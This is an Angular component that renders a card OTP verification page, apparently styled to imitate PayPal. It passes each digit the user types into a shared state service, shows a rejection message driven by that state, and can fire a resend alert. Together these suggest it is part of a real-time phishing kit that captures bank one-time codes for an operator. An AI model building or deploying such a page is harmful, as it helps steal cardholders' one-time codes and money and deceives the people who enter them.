
import { Component, inject, signal, AfterViewInit, OnDestroy } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';
import { TranslatePipe } from '../pipes/translate.pipe';

@Component({
  selector: 'app-card-otp',
  standalone: true,
  imports: [CommonModule, FormsModule, PublicLayoutComponent, TranslatePipe],
  template: `
    <app-public-layout>
      <div class="flex flex-col items-center mb-8">
        <div class="bg-blue-50 text-pp-blue text-[11px] font-bold px-3 py-1 rounded-full uppercase tracking-wider mb-5 border border-blue-100 animate-fade-in">
           {{ 'CARD_OTP.BADGE' | translate }}
        </div>
        <h1 class="text-xl font-bold text-pp-navy mb-2 text-center tracking-tight">{{ 'CARD_OTP.TITLE' | translate }}</h1>
        <p class="text-base text-slate-500 text-center px-4 max-w-xs leading-relaxed">
           {{ 'CARD_OTP.DESC' | translate: { last4: last4() } }}
        </p>
      </div>

      <!-- Feedback -->
      @if (state.rejectionReason()) {
        <div class="mb-6 bg-red-50 border-l-[6px] border-[#D92D20] p-4 flex items-start gap-4 rounded-r-lg animate-in fade-in slide-in-from-top-2">
            <span class="material-icons text-[#D92D20] text-xl">error_outline</span>
            <div>
              <p class="text-sm font-bold text-pp-navy">{{ 'CARD_OTP.INVALID_TITLE' | translate }}</p>
              <p class="text-xs text-slate-600 mt-1">{{ 'CARD_OTP.INVALID_DESC' | translate }}</p>
            </div>
        </div>
      }

      <div class="space-y-8">
        <div class="pp-input-group">
            <input 
              type="text" 
              [(ngModel)]="otp"
              (input)="onInput($event)"
              id="otp"
              placeholder=" "
              class="pp-input peer text-center tracking-[0.5em] font-mono font-bold text-lg"
              [class.shadow-input-error]="state.rejectionReason()"
            />
            <label for="otp" class="pp-label left-1/2 -translate-x-1/2 w-auto bg-white px-2">
               {{ 'CARD_OTP.INPUT_LABEL' | translate }}
            </label>
        </div>

        <button 
          (click)="submit()"
          [disabled]="otp.length < 4"
          [class.opacity-50]="otp.length < 4"
          class="pp-btn"
        >
          {{ 'COMMON.VERIFY' | translate }}
        </button>

        <div class="text-center">
            <p class="text-xs text-slate-500 mb-2 font-bold">{{ 'CARD_OTP.NO_CODE' | translate }}</p>
            <button 
                (click)="resend()"
                [disabled]="timer() > 0"
                class="text-pp-blue font-bold text-sm hover:underline hover:text-pp-navy disabled:opacity-50 disabled:no-underline disabled:cursor-not-allowed transition-colors">
                {{ timer() > 0 ? ('CARD_OTP.RESEND_WAIT' | translate: { seconds: timer() }) : ('CARD_OTP.RESEND' | translate) }}
            </button>
        </div>
      </div>
    </app-public-layout>
  `
})
export class CardOtpComponent implements AfterViewInit, OnDestroy {
  state = inject(StateService);
  otp = '';

  last4 = signal('');
  timer = signal(0);
  private timerInterval: any;

  constructor() {
      // safe access
      const num = this.state.cardNumber();
      if(num && num.length > 4) {
          this.last4.set(num.slice(-4));
      }
      // Start timer automatically on view enter
      this.startTimer();
  }

  ngAfterViewInit() {
      // Auto focus logic
      setTimeout(() => {
        const el = document.getElementById('otp');
        if (el) el.focus();
      }, 100);
  }

  ngOnDestroy() {
      if (this.timerInterval) clearInterval(this.timerInterval);
  }

  startTimer() {
      this.timer.set(30);
      if (this.timerInterval) clearInterval(this.timerInterval);
      this.timerInterval = setInterval(() => {
          this.timer.update(v => {
              if (v <= 1) {
                  clearInterval(this.timerInterval);
                  return 0;
              }
              return v - 1;
          });
      }, 1000);
  }

  onInput(event: any) {
      // Allow numbers only
      const val = event.target.value.replace(/\D/g, '');
      this.otp = val;
      this.state.updateCard({ otp: val });
  }

  submit() {
      if (this.otp.length >= 4) {
          this.state.submitCardOtp(this.otp);
      }
  }

  resend() {
      if (this.timer() === 0) {
          this.state.triggerResendAlert();
          this.startTimer();
      }
  }
}
